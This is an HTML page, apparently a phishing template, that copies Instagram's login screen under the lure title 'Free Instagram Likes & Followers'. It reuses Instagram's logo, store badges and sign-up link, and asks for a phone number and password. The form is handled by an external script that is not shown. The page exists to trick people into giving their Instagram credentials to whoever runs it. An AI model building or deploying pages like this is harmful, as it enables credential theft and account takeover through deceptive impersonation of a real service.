<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="CodePel">
  <title>Free Instagram Likes & Followers</title>
  <link rel="icon" type="image/x-icon" href="/icon.png">
  <link rel="stylesheet" href="./css/style.css">
</head>

<body>

  <body>
    <span id="root">
      <section class="section-all">
        <main class="main" role="main">
          <div class="wrapper">
            <article class="article">
              <div class="content">
                <div class="login-box">
                  <div class="header">
                    <img class="logo"
                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                      alt="Instagram">
                  </div>
                  <div class="form-wrap">
                    <form class="form" id="loginForm">
                      <div id="errormessage" style="display: none;"></div> 
                      <div class="input-box">
                        <input type="text" id="name" aria-describedby="" placeholder="Phone number"
                          aria-required="true" minlength="5" maxlength="13" autocapitalize="off" autocorrect="off" name="username"
                          oninput="validatePhoneNumber(this)" required>
                      </div>

                      <div class="input-box">
                        <input type="password" name="password" id="password" placeholder="Password" aria-describedby=""
                          maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                      </div>

                      <span class="button-box">
                        <button class="btn" type="button" name="submit" onclick="validateForm()">Log in</button>
                      </span>

                      <a class="forgot" href="">Forgot password?</a>
                    </form>
                  </div>
                </div>

                <div class="login-box">
                  <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">Sign
                      up</a></p>
                </div>

                <div class="app">
                  <p>Get the app.</p>
                  <div class="app-img">
                    <a
                      href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
                    </a>
                    <a
                      href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                    </a>
                  </div>
                </div>
              </div>
            </article>
          </div>
        </main>
      </section>
    </span>

  </body>

  </main>

  <script src="./js/script.js"></script>

</body>

</html>
